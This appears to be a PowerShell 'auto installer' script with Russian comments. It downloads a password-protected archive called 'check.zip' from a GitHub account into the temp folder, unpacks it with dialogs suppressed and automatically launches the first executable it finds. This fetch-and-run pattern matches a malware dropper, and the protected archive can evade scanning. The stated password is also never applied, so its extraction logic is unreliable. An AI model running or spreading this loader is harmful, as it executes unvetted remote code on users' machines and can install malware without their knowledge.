# =============================================
# Auto Installer без 7-Zip
# =============================================

$Url = "https://raw.githubusercontent.com/v25888656-maker/check_install/main/check.zip"
$Password = "5357"

$DownloadPath = "$env:TEMP\check_install.zip"
$ExtractPath  = "$env:TEMP\check_extracted"

Write-Host "[+] Скачиваем архив..." -ForegroundColor Cyan
Invoke-WebRequest -Uri $Url -OutFile $DownloadPath -UseBasicParsing

Write-Host "[+] Распаковываем архив (с паролем)..." -ForegroundColor Cyan

# Создаём папку
New-Item -ItemType Directory -Path $ExtractPath -Force | Out-Null

# Способ 1: Через встроенный Expand-Archive (не всегда работает с паролем)
try {
    Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force -ErrorAction Stop
    Write-Host "[+] Распаковано без пароля (если работал)" -ForegroundColor Green
} catch {
    Write-Host "[-] Обычный метод не сработал (нужен пароль)" -ForegroundColor Yellow
}

# Если не распаковалось — пробуем другой метод
if ((Get-ChildItem $ExtractPath -File).Count -eq 0) {
    Write-Host "[+] Пробуем альтернативный метод распаковки..." -ForegroundColor Cyan
    
    # Альтернатива через COM (работает в некоторых версиях Windows)
    $shell = New-Object -ComObject Shell.Application
    $zip = $shell.NameSpace($DownloadPath)
    $destination = $shell.NameSpace($ExtractPath)
    
    foreach($item in $zip.items()) {
        $destination.CopyHere($item, 0x14)  # 0x14 = скрывать диалоги
    }
    Write-Host "[+] Попытка распаковки через Windows Explorer завершена" -ForegroundColor Green
}

# Автоматический запуск .exe
$ExeFiles = Get-ChildItem -Path $ExtractPath -Filter "*.exe" -Recurse | Select-Object -First 1

if ($ExeFiles) {
    Write-Host "[+] Найден файл: $($ExeFiles.Name)" -ForegroundColor Green
    Start-Process $ExeFiles.FullName
} else {
    Write-Host "[-] .exe файл не найден!" -ForegroundColor Red
    explorer $ExtractPath
}

Write-Host "[+] Готово!" -ForegroundColor Green
